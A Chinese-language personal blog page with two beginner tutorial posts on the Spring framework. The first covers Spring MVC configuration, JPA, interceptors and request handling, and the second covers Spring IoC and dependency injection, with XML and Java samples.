<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/uploads/xzpq.jpg?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta name="description" content="找回当年那个被寄予厚望的自己">
<meta property="og:type" content="website">
<meta property="og:title" content="P0rZ9&#39;s blog">
<meta property="og:url" content="http://yoursite.com/page/2/index.html">
<meta property="og:site_name" content="P0rZ9&#39;s blog">
<meta property="og:description" content="找回当年那个被寄予厚望的自己">
<meta property="og:locale" content="default">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="P0rZ9&#39;s blog">
<meta name="twitter:description" content="找回当年那个被寄予厚望的自己">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/page/2/"/>





  <title>P0rZ9's blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="default">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">P0rZ9's blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
            Archives
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/23/Spring_mvc/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/01/23/Spring_mvc/" itemprop="url">ssm基础之Spring MVC</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-01-23T08:15:41+08:00">
                2019-01-23
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>跟着大佬的几篇文章学习了SpringMVC,记录一下。</p>
</blockquote>
<p>SpringMVC:<br>springmvc是一个基于mvc的web框架。</p>
<h4 id="Spring-MVC基本配置"><a href="#Spring-MVC基本配置" class="headerlink" title="Spring MVC基本配置"></a>Spring MVC基本配置</h4><p>1.在web.xml配置入口Servlet    </p>
<pre><code>&lt;servlet&gt;
    &lt;servlet-name&gt;mvc-dispatcher&lt;/servlet-name&gt; 
    &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt;
    &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;
  &lt;/servlet&gt;

  &lt;servlet-mapping&gt;
    &lt;servlet-name&gt;mvc-dispatcher&lt;/servlet-name&gt;
    &lt;url-pattern&gt;/&lt;/url-pattern&gt;
  &lt;/servlet-mapping&gt;    
</code></pre><p>Servlet名字为:mvc-dispatcher   uri-pattern为/:拦截所有请求<br>2.SpringMVC的映射配置文件<br>在<code>mvc-dispatcher-servlet.xml</code>,配置SpringMVC的一些Controller的初始化,静态文件的映射策略,视图的配置等,这里只说下视图解析器的相关配置:        </p>
<pre><code>&lt;!--ViewResolver 视图解析器--&gt;
&lt;!--用于支持Servlet、JSP视图解析--&gt;
&lt;bean id=&quot;jspViewResolver&quot; class=&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;&gt;
    &lt;property name=&quot;viewClass&quot; value=&quot;org.springframework.web.servlet.view.JstlView&quot;/&gt;
    &lt;property name=&quot;prefix&quot; value=&quot;/WEB-INF/pages/&quot;/&gt;
    &lt;property name=&quot;suffix&quot; value=&quot;.jsp&quot;/&gt;
&lt;/bean&gt;
</code></pre><p>在SpringMVC中,controller会返回一个字符串(jsp名字)。在jspViewResolver的2个属性分别为jsp文件的前缀(/WEB-INF/pages/)与后缀(.jsp),这样在controller里面,如果返回的字符串是index(<code>return &quot;index&quot;</code>),SpringMVC就会找到<code>/WEB-INF/pages/index.jsp</code>文件    </p>
<p>3.Maven自动导入jar包<br> 既然我们做SpringMVC开发,肯定少不了相关的jar包,但是随着项目增大,原来那种下载包然后导入感觉太麻烦,现在使用Maven就变得简单了。    其实maven的工作原理简单理解就是自动将你需要的jar包下载到本地,然后关联到项目中,所有的包都存储在几个中央仓库里面,需要什么包,就取出什么包<br> pom.xml<br> 重点看<code>&lt;dependencies&gt;</code>标签，将对每个包的需求都看成一个依赖<code>&lt;depedency&gt;</code>,定义在<code>&lt;dependencies&gt;</code>中,在每个<code>&lt;dependencies&gt;</code>中,需要提供jar包的groupid,artifactId和version,我们引入一个junit包的格式:</p>
<pre><code>  &lt;dependency&gt;
    &lt;groupId&gt;junit&lt;/groupId&gt;
    &lt;artifactId&gt;junit&lt;/artifactId&gt;
    &lt;version&gt;3.8.1&lt;/version&gt;
    &lt;scope&gt;test&lt;/scope&gt;
&lt;/dependency&gt;
</code></pre><p>要引入其他包,查询:<a href="https://mvnrepository.com/" target="_blank" rel="noopener">https://mvnrepository.com/</a><br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-15.21.52.56-image.png" alt="2019-01-15.21.52.56-image.png"><br> 在pom.xml中填写<code>&lt;dependencies&gt;</code>标签的内容即可</p>
<p>4.数据库配置<br>SpringMVC集成Spring Data JPA（由 Hibernate JPA 提供），来进行强大的数据库访问<br>在之前接触MVC模式中,数据库的一张表往往对应着一个JavaBean,在SpringMVC中,这个JavaBean就相当于model,且Idea会自动帮我们生成这些类<br>配置数据库有2种方法,由于刚开始学习,先使用较简单的,直接在<code>mvc-dispatcher-servlet.xml</code>中配置:    </p>
<pre><code>&lt;bean id=&quot;entityManagerFactory&quot; class=&quot;org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean&quot;&gt;
        &lt;property name=&quot;persistenceUnitName&quot; value=&quot;defaultPersistenceUnit&quot;/&gt;
        &lt;property name=&quot;packagesToScan&quot; value=&quot;com.gaussic.model&quot; /&gt;
        &lt;property name=&quot;jpaVendorAdapter&quot;&gt;
            &lt;bean class=&quot;org.springframework.orm.jpa.vendor.HibernateJpaVendorAdapter&quot;/&gt;
        &lt;/property&gt;
        &lt;property name=&quot;jpaProperties&quot;&gt;
            &lt;props&gt;
                &lt;prop key=&quot;hibernate.connection.driver_class&quot;&gt;com.mysql.jdbc.Driver&lt;/prop&gt;
                &lt;prop key=&quot;hibernate.connection.url&quot;&gt;jdbc:mysql://localhost:3306/springdemo?useSSL=false&lt;/prop&gt;
                &lt;prop key=&quot;hibernate.connection.username&quot;&gt;root&lt;/prop&gt;
                &lt;prop key=&quot;hibernate.connection.password&quot;&gt;111111&lt;/prop&gt;
                &lt;prop key=&quot;hibernate.show_sql&quot;&gt;false&lt;/prop&gt;
                &lt;prop key=&quot;hibernate.connection.useUnicode&quot;&gt;true&lt;/prop&gt;
                &lt;prop key=&quot;hibernate.connection.characterEncoding&quot;&gt;UTF-8&lt;/prop&gt;
                &lt;prop key=&quot;hibernate.format_sql&quot;&gt;true&lt;/prop&gt;
                &lt;prop key=&quot;hibernate.use_sql_comments&quot;&gt;true&lt;/prop&gt;
                &lt;prop key=&quot;hibernate.hbm2ddl.auto&quot;&gt;update&lt;/prop&gt;
                &lt;prop key=&quot;hibernate.connection.autoReconnect&quot;&gt;true&lt;/prop&gt;
                &lt;prop key=&quot;hibernate.dialect&quot;&gt;org.hibernate.dialect.MySQL5Dialect&lt;/prop&gt;
            &lt;prop key=&quot;connection.autoReconnectForPools&quot;&gt;true&lt;/prop&gt;
            &lt;prop key=&quot;connection.is-connection-validation-required&quot;&gt;true&lt;/prop&gt;

            &lt;prop key=&quot;hibernate.c3p0.validate&quot;&gt;true&lt;/prop&gt;
            &lt;prop key=&quot;hibernate.connection.provider_class&quot;&gt;org.hibernate.service.jdbc.connections.internal.C3P0ConnectionProvider&lt;/prop&gt;
            &lt;prop key=&quot;hibernate.c3p0.min_size&quot;&gt;5&lt;/prop&gt;
            &lt;prop key=&quot;hibernate.c3p0.max_size&quot;&gt;600&lt;/prop&gt;
            &lt;prop key=&quot;hibernate.c3p0.timeout&quot;&gt;1800&lt;/prop&gt;
            &lt;prop key=&quot;hibernate.c3p0.max_statements&quot;&gt;50&lt;/prop&gt;
            &lt;prop key=&quot;hibernate.c3p0.preferredTestQuery&quot;&gt;SELECT 1;&lt;/prop&gt;
            &lt;prop key=&quot;hibernate.c3p0.testConnectionOnCheckout&quot;&gt;true&lt;/prop&gt;
            &lt;prop key=&quot;hibernate.c3p0.idle_test_period&quot;&gt;3000&lt;/prop&gt;
        &lt;/props&gt;
    &lt;/property&gt;
&lt;/bean&gt;
</code></pre><p>修改上面的连接信息,然后使用Persistence工具再进行配置<br>参考:<a href="https://my.oschina.net/gaussik/blog/513444" target="_blank" rel="noopener">https://my.oschina.net/gaussik/blog/513444</a></p>
<p>5.JPA操作<br>JPA是Java Persistence API的简称,就是定义对数据库的操作。首先新建一个repository包,在repository包中的2个接口:UserRepository，BlogRepository并让其都继承JpaRepository。<br>在JpaRepository中定义了几个简化操作数据库的方法        </p>
<pre><code>   findAll()：查找表中所有记录；
findOne(Integer id)：按id来查找某一条记录
findByXXX(Object xxx)：在这里XXX是一个字段名，根据该字段的值开查找所有记录；
save()和delete()：添加一条记录以及删除一条记录
</code></pre><p>除此之外,我们可以在该接口中定义新的方法,如项目中定义的更新用户信息的例子:</p>
<pre><code>@Repository
public interface UserRepository extends     JpaRepository&lt;UserEntity, Integer&gt; {

@Modifying      // 说明该方法是修改操作
@Transactional  // 说明该方法是事务性操作
// 定义查询
// @Param注解用于提取参数
@Query(&quot;update UserEntity us set us.nickname=:qNickname, us.firstName=:qFirstName, us.lastName=:qLastName, us.password=:qPassword where us.id=:qId&quot;)
public void updateUser(@Param(&quot;qNickname&quot;) String nickname, @Param(&quot;qFirstName&quot;) String firstName,
                       @Param(&quot;qLastName&quot;) String qLastName, @Param(&quot;qPassword&quot;) String password, @Param(&quot;qId&quot;) Integer id);
}
</code></pre><p>然后在controller中使用以下语句更新即可</p>
<pre><code>userRepository.updateUser(user.getNickname(), user.getFirstName(),
                user.getLastName(), user.getPassword(), user.getId());
userRepository.flush();   //刷新
</code></pre><p>6.SpringMVC 拦截器<br>IndexInterceptor.java            </p>
<pre><code>package com.interceptor;
import java.util.Date;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.springframework.web.servlet.ModelAndView;
import org.springframework.web.servlet.handler.HandlerInterceptorAdapter;



/*在业务处理器处理请求(controller)之前被调用
false：从当前拦截器往回执行所有拦截器的afterCompletion()
true:依次执行,直到preHandle都完成---&gt;controller--&gt;从最后一个往回执行postHandle()---&gt;从最后一个往回执行afterCompletion()*/


public class IndexInterceptor extends HandlerInterceptorAdapter {

public boolean preHandle(HttpServletRequest request,
                             HttpServletResponse response, Object handler) throws Exception {

    System.out.println(&quot;preHandle(), 在访问Controller之前被调用&quot;);
    return true;

}


 //controller之后,view之前        
public void postHandle(HttpServletRequest request,
                       HttpServletResponse response, Object handler,
                       ModelAndView modelAndView) throws Exception {
    System.out.println(&quot;postHandle(), 在访问Controller之后，访问视图之前被调用,这里可以注入一个时间到modelAndView中，用于后续视图显示&quot;);
    modelAndView.addObject(&quot;date&quot;,&quot;由拦截器生成的时间:&quot; + new Date());
}

 //view之后,用于清理资源    
 public void afterCompletion(HttpServletRequest request,
                            HttpServletResponse response, Object handler, Exception ex)
        throws Exception {

    System.out.println(&quot;afterCompletion(), 在访问视图之后被调用&quot;);
}

}
</code></pre><p>多定义几个拦截器即可理解其执行顺序:<br>在浏览器访问localhost:8080/index时,控制台打印:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-18.09.59.30-image.png" alt="2019-01-18.09.59.30-image.png"></p>
<h4 id="Spring-MVC请求流程"><a href="#Spring-MVC请求流程" class="headerlink" title="Spring MVC请求流程"></a>Spring MVC请求流程</h4><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-20.23.10.44-image.png" alt="2019-01-20.23.10.44-image.png"></p>
<p>1.首先,请求离开浏览器后,第一步到达DispatcherServlet,拦截请求并发送给相应的Spring MVC控制器(DispatcherServlet的任务就是拦截请求并发给控制器)<br>2.处理器映射<br>处理器会根据请求携带的url来进行决策请求对应的控制器是哪个,我们配置控制simpleURLHandlerMapping将/hello地址交给helloController处理:</p>
<pre><code>&lt;bean id=&quot;simpleUrlHandlerMapping&quot;
      class=&quot;org.springframework.web.servlet.handler.SimpleUrlHandlerMapping&quot;&gt;
    &lt;property name=&quot;mappings&quot;&gt;
        &lt;props&gt;
            &lt;!-- /hello 路径的请求交给 id 为 helloController 的控制器处理--&gt;
            &lt;prop key=&quot;/hello&quot;&gt;helloController&lt;/prop&gt;
        &lt;/props&gt;
    &lt;/property&gt;
&lt;/bean&gt;
&lt;bean id=&quot;helloController&quot; class=&quot;controller.HelloController&quot;&gt;&lt;/bean&gt;
</code></pre><p>也可以用注释:</p>
<pre><code>@Controller
public class HelloController{

@RequestMapping(value = &quot;/hello&quot;, method = RequestMethod.GET)
public String hello{
    //处理逻辑
    //返回视图名
}
</code></pre><p>用了注释就不需要在xml文件中指定controller了,不过需要加上<code>&lt;context:component-scan base-package=&quot;com.controller&quot;/&gt;</code><br>3.控制器处理好相关业务后,将需要返回的数据(Model)和用于渲染输出的视图名(Jsp)返回给DispatcherServlet            </p>
<pre><code>public String getUsers(ModelMap modelMap) {

    //处理逻辑

    //返回模型数据
    modelMap.addAttribute(&quot;userList&quot;, userList);

    //返回用于渲染输出的视图名
    return &quot;admin/users&quot;;
}
</code></pre><p>4.视图解析器            </p>
<pre><code>&lt;bean id=&quot;viewResolver&quot;
      class=&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;&gt;
    &lt;property name=&quot;prefix&quot; value=&quot;/WEB-INF/page/&quot; /&gt;
    &lt;property name=&quot;suffix&quot; value=&quot;.jsp&quot; /&gt;
&lt;/bean&gt;
</code></pre><p>这是一个Spring MVC内置的一个视图解析器,该解析器遵循:在controller中返回的视图名上添加前缀和后缀,进而确定一个web应用中视图资源的物理路径。上面的解析器说明需要返回目录webapp/WEB-INF/page/admin下的users.jsp文件                </p>
<p>5.视图(users.jsp)<br>在视图文件中接收Controller返回的数据(Model)并用于展示    </p>
<pre><code>&lt;c:forEach items=&quot;${userList}&quot; var=&quot;user&quot;&gt;
    ${user.id}
    ${user.nickname}
    ${user.firstName} ${user.lastName}
    ${user.password}
&lt;/c:forEach&gt;
</code></pre><h4 id="控制器接收请求数据"><a href="#控制器接收请求数据" class="headerlink" title="控制器接收请求数据"></a>控制器接收请求数据</h4><p>1.Servlet原生API        </p>
<pre><code>@RequestMapping(value = &quot;/admin/login1&quot;, method = RequestMethod.POST)
public  String loginp1(HttpServletRequest request, HttpServletResponse response){
    String username1 = request.getParameter(&quot;username1&quot;);
    String password1 = request.getParameter(&quot;password1&quot;);
</code></pre><p>2.使用@RequestParam(“前台参数名”)</p>
<pre><code>@RequestMapping(value = &quot;/admin/login3&quot;, method = RequestMethod.POST)
public  String loginp3(@RequestParam(&quot;username&quot;) String username3, @RequestParam(&quot;password&quot;) String password3){

    System.out.println(username3);
    System.out.println(password3);
    return null;
}
</code></pre><p>3.使用同名匹配规则        </p>
<pre><code>@RequestMapping(value = &quot;/admin/login2&quot;, method = RequestMethod.POST)
public  String loginp2(String username2,String password2){

    System.out.println(username2);
    System.out.println(password2);
    return null;
}
</code></pre><p>4.使用模型(model)传参数<br>要求:前台参数名与模型字段名相同。            </p>
<pre><code>User模型
package pojo;

public class User {

    String userName;
    String password;

    /* getter and setter */
}
</code></pre><p>在控制器中使用:            </p>
<pre><code>@RequestMapping(&quot;/login&quot;)
public String get_(User user){
    //user.getUsername();
    //user.getPassword();
}
</code></pre><h4 id="中文乱码问题"><a href="#中文乱码问题" class="headerlink" title="中文乱码问题"></a>中文乱码问题</h4><p>同servlet一样,只对POST方法有效(因为直接处理的request)<br>通过配置SpringMVC的字符编码过滤器来完成,web.xml中添加</p>
<pre><code>&lt;filter&gt;
    &lt;filter-name&gt;CharacterEncodingFilter&lt;/filter-name&gt;
    &lt;filter-class&gt;org.springframework.web.filter.CharacterEncodingFilter&lt;/filter-class&gt;
    &lt;init-param&gt;
        &lt;param-name&gt;encoding&lt;/param-name&gt;
        &lt;!-- 设置编码格式 --&gt;
        &lt;param-value&gt;utf-8&lt;/param-value&gt;
    &lt;/init-param&gt;
&lt;/filter&gt;
&lt;filter-mapping&gt;
    &lt;filter-name&gt;CharacterEncodingFilter&lt;/filter-name&gt;
    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;
&lt;/filter-mapping&gt;
</code></pre><h4 id="控制器回显数据"><a href="#控制器回显数据" class="headerlink" title="控制器回显数据"></a>控制器回显数据</h4><p>1.使用 Servlet 原生 API 来实现    </p>
<pre><code>@RequestMapping(&quot;/value&quot;)
public ModelAndView hand(HttpServletRequest request,                              
HttpServletResponse response) {
    request.setAttribute(&quot;message&quot;,&quot;成功！&quot;);
    return new ModelAndView(&quot;test1&quot;);
}
</code></pre><p>2.使用 Spring MVC 所提供的 ModelAndView 对象</p>
<pre><code>@RequestMapping(value = &quot;/admin/login&quot;, method = RequestMethod.GET)
  public ModelAndView login(HttpRequest request, HttpResponse response){
      ModelAndView mv = new ModelAndView(&quot;admin/login&quot;);
      mv.addObject(&quot;message&quot;,&quot;测试&quot;);
      return mv;
  }
</code></pre><p>3.使用 Model 对象(常用)            </p>
<pre><code>session.setAttribute(&quot;count&quot;,i);
modelMap.addAttribute(&quot;count&quot;,i);
</code></pre><p>使用@ModelAttribute注解            </p>
<pre><code>@ModelAttribute
public void model(Model model) {
    model.addAttribute(&quot;message&quot;, &quot;注解成功&quot;);
}

@RequestMapping(&quot;/value&quot;)
public String handleRequest() {
    return &quot;test1&quot;;
}
</code></pre><p>这样程序就会在调用该控制器所有的方法前,调用model()方法将message添加到页面参数中去,在视图中可直接调用。</p>
<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接:"></a>参考链接:</h4><p><a href="https://my.oschina.net/gaussik/blog/385697" target="_blank" rel="noopener">https://my.oschina.net/gaussik/blog/385697</a><br><a href="http://how2j.cn/k/springmvc/springmvc-springmvc/615.html" target="_blank" rel="noopener">http://how2j.cn/k/springmvc/springmvc-springmvc/615.html</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/10/ssm基础之Spring/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/01/10/ssm基础之Spring/" itemprop="url">ssm基础之Spring</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-01-10T08:15:41+08:00">
                2019-01-10
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>早几天就将Java Web的实验收尾了,项目代码(简易论坛)已经上传到Github了,没事儿看看ssm框架,争取早日撸个商城出来。</p>
</blockquote>
<hr>
<p><a href="https://github.com/P0rZ9/Java_Web/tree/master/Java_Web_BBS" target="_blank" rel="noopener">Java_Web_Bbs项目地址</a></p>
<p>SSM <strong>(Spring+SpringMVC+MyBatis)</strong> 框架集由Spring、MyBatis两个开源框架整合而成（SpringMVC是Spring中的部分内容）。常作为数据源较简单的web项目的框架。先了解一波Spring。</p>
<blockquote>
<p>Spring是一个开源框架，主要是为了解决项目开发中的紧耦合的问题，采用了控制反转和AOP技术简化了企业级应用的开发，让开发者能够更专注于业务的开发，减少了流程式的代码，简化了开发过程，所以受到开发人员的欢迎。</p>
</blockquote>
<h2 id="IOC-DI-控制反转-依赖注入"><a href="#IOC-DI-控制反转-依赖注入" class="headerlink" title="IOC/DI 控制反转/依赖注入"></a>IOC/DI 控制反转/依赖注入</h2><blockquote>
<p>在java开发中，如果要使用另外一个类的定义的功能，譬如在A类中需要调用B类的方法，那么一般的做法就是在A类中实例化一个B的对象,通过A.b.method()这样的方式来调用，那么这样造成了什么后果呢？那就是A强烈的依赖于B，这个时候就要求B中方法保持稳定，不能随意变动。这个时候B中的代码就被A给“限制”了，如果这个时候你要修改B中的方法，譬如将method()改为methodA()，那么同时也就要修改A中的代码以适应这个改变，这样的程序改动起来很大，也就是说扩展性很低。<br>控制反转就是为了解决这类问题所提出来的一种概念，主要就是通过一个容器来管理对象之间的依赖关系，Spring就提供了这样的一个容器来管理对象之间的依赖。就以上面的场景来说，A需要用到B中的功能，A只需要向容器提出我需要包含xx功能的对象，容器就能给你一个这样的对象，至于这个对象到底是不是B？你管那么多呢？只要能用就行对吧。<br>Spring中提供的这样的容器就是我们经常提到的ApplicationContext。</p>
</blockquote>
<h2 id="AOP-Aspect-Oriented-Program-面向切面编程"><a href="#AOP-Aspect-Oriented-Program-面向切面编程" class="headerlink" title="AOP(Aspect Oriented Program)面向切面编程"></a>AOP(Aspect Oriented Program)面向切面编程</h2><blockquote>
<p>在开发中，经常会遇到相同的模块，例如打印日志，安全管理这样的功能，可能每一个类都会有这样的需要。譬如我要记录每一个类的调用记录，使用参数等信息，这种功能k可以在每个类中加入相似的代码，直接打印出来就好。但是这种方法将辅助性的功能放到实际业务里去实现了，使每个方法承担的使命太多，如果能狗自动打印日志，不是更好吗？而这种通用的功能就称之为一个切面，面向切面的编程能够简化开发的实际代码，更好的关注于业务本身。</p>
</blockquote>
<h3 id="演示IOC-反转控制-和DI-依赖注入"><a href="#演示IOC-反转控制-和DI-依赖注入" class="headerlink" title="演示IOC(反转控制)和DI(依赖注入)"></a>演示IOC(反转控制)和DI(依赖注入)</h3><h4 id="运行TestSpring演示用Spring获取一个对象-并打印name"><a href="#运行TestSpring演示用Spring获取一个对象-并打印name" class="headerlink" title="运行TestSpring演示用Spring获取一个对象,并打印name"></a>运行TestSpring演示用Spring获取一个对象,并打印name</h4><p>1.<strong>Eclipse新建项目(Java Project),项目名字spring</strong><br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-10.11.02.18-image.png" alt="2019-01-10.11.02.18-image.png"></p>
<p>2.<strong>下载项目所需的jar包,并导入项目中(Build Path—&gt;Add Externam JARs)</strong><br><a href="http://how2j.cn/frontdownload?bean.id=1484" target="_blank" rel="noopener">Jar包下载</a>,导入后:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-10.11.03.44-image.png" alt="2019-01-10.11.03.44-image.png"></p>
<p>3.<strong>pojo</strong><br>准备pojo Source类    </p>
<pre><code>package pojo;

public class Source {
     private int id;
    private String name;

    public int getId() {
        return id;
    }
    public void setId(int id) {
        this.id = id;
    }
    public String getName() {
        return name;
    }
    public void setName(String name) {
        this.name = name;
    }  
}
</code></pre><p><strong>4.applicationContext.xml</strong><br>在src目录下新建applicationContext.xml,这是Spring的核心配置文件,通过关键字s获取Source对象,该对象获取的时候,即被注入了字符串”test1”到name属性,数值1到id属性中。    </p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;beans         
xmlns=&quot;http://www.springframework.org/schema/beans&quot;
xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
xmlns:aop=&quot;http://www.springframework.org/schema/aop&quot;
xmlns:tx=&quot;http://www.springframework.org/schema/tx&quot;
        xmlns:context=&quot;http://www.springframework.org/schema/context&quot;
xsi:schemaLocation=&quot;
   http://www.springframework.org/schema/beans
   http://www.springframework.org/schema/beans/spring-beans-3.0.xsd
 http://www.springframework.org/schema/aop
 http://www.springframework.org/schema/aop/spring-aop-3.0.xsd
 http://www.springframework.org/schema/tx
 http://www.springframework.org/schema/tx/spring-tx-3.0.xsd
 http://www.springframework.org/schema/context     
 http://www.springframework.org/schema/context/spring-context-3.0.xsd&quot;&gt;

&lt;bean name=&quot;s&quot; class=&quot;pojo.Source&quot;&gt;
    &lt;property name=&quot;name&quot; value=&quot;test1&quot; /&gt;
    &lt;property name=&quot;id&quot; value=&quot;1&quot; /&gt;
&lt;/bean&gt;
</code></pre><p></p>
<p><strong>5.TestSpring</strong><br>测试代码,演示通过spring获取Source对象,以及该对象被注入的name属性。如图所示,打印通过Spring拿到的Source对象的name与id属性。    </p>
<pre><code>package test;

import org.springframework.context.ApplicationContext;
import org.springframework.context.support.ClassPathXmlApplicationContext;
import pojo.Source;

public class TestSpring {
public static void main(String[] args) {
    ApplicationContext context = new ClassPathXmlApplicationContext(
            new String[] { &quot;applicationContext.xml&quot; });

    Source s = (Source) context.getBean(&quot;s&quot;);

    System.out.println(s.getName());
    System.out.println(s.getId());
    }
}
</code></pre><p>运行结果:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-10.11.18.44-image.png" alt="2019-01-10.11.18.44-image.png">    </p>
<p><strong>6.原理图</strong><br>获取对象的方式比较:<br>传统:<code>Source s = new Source();</code><br>IOC:<code>Source s = (Source) context.getBean(&quot;s&quot;);</code><br>对象的声明周期由Spring来管理,直接从Spring那里去获取一个对象,IOC是控制反转(Inversion Of Control)的缩写,控制权交给了Spring。    </p>
<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-10.11.22.29-image.png" alt="2019-01-10.11.22.29-image.png"></p>
<hr>
<p>上面第一个例子演示了注入对象的属性,下面演示注入Source对象</p>
<h4 id="向Product注入Source对象"><a href="#向Product注入Source对象" class="headerlink" title="向Product注入Source对象"></a>向Product注入Source对象</h4><p>1.Product.java    </p>
<pre><code>package pojo;

public class Product {
    private int id;
    public int getId() {
        return id;
    }
    public void setId(int id) {
        this.id = id;
    }
    public String getName() {
        return name;
    }
    public void setName(String name) {
        this.name = name;
    }
    public Source getSource() {
        return source;
    }
    public void setSource(Source source) {
        this.source = source;
    }
    private String name;
    private Source source;
}
</code></pre><p>2.applicationContext.xml(关键) 在创建Product的时候注入一个Source对象(使用ref来注入另一个对象)        </p>
<pre><code>&lt;bean name=&quot;s&quot; class=&quot;pojo.Source&quot;&gt;
